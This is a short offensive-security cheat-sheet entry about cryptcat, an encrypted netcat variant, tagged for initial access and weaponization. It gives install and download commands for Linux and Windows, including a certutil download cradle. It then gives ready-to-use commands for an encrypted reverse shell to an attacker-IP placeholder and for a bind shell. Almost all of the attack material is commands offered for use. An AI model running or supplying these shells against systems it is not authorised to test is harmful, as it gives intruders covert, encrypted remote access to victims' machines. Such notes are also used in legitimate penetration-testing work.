---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
---
# #cryptcat

## 01 - Install

### 1.1 - Package Manager

#### 1.1.1 - Debian-Based Distros

Download the package then extract it.

```
$ apt download cryptcat

$ dpkg -x cryptcat_*.deb work
```

Then you can just execute the program as it was portable.

```
$ work/usr/bin/cryptcat -h
```

#### 1.1.2 - Arch Linux Based Distros

You can just download the `.tar.xz` file and extract it.

```
$ wget https://mirror.archstrike.org/x86_64/archstrike/cryptcat-1.2.1-4-any.pkg.tar.xz

$ tar xJf cryptcat-*-any.pkg.tar.xz
```

Then you can just execute the program as it was portable.

```
$ usr/bin/cryptcat -h
```

### 1.2 - Download Pre-compiled Program

```
C:\> certutil.exe -urlcache -split -f https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release/raw/refs/heads/master/Release/cryptcat.exe cryptcat.exe

C:\> curl.exe -sO https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release/raw/refs/heads/master/Release/cryptcat.exe
```

## 02 - Execute Payloads

### 2.1 - Reverse Shell

```
> cryptcat -k <password> <attacker_IP> <attacker_PORT>
```

### 2.2 - Bind Shell

```
> cryptcat -k <password> -lp <local_PORT>
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xA - Internal Reconnaissance/Software/Discover Programs/Manual/Living off the Land|Enumeration and Discovery: Discover Programs]]

- [[DEB|File Transfer and Data Exfiltration: Linux Package Manager DEB]]

- [[RPM|File Transfer and Data Exfiltration: Linux Package Manager RPM]]

- [[AUR|File Transfer and Data Exfiltration: Linux Package Manager AUR]]

- [[PFL|File Transfer and Data Exfiltration: Linux Package Manager PFL]]

### Source Repositories

- [Cryptcat](https://cryptcat.sourceforge.io)

- [Cryptcat Windows Implementation](https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release)

### Hacking Articles

- [Hacking Articles: Comprehensive Guide on CryptCat](https://www.hackingarticles.in/comprehensive-guide-on-cryptcat/)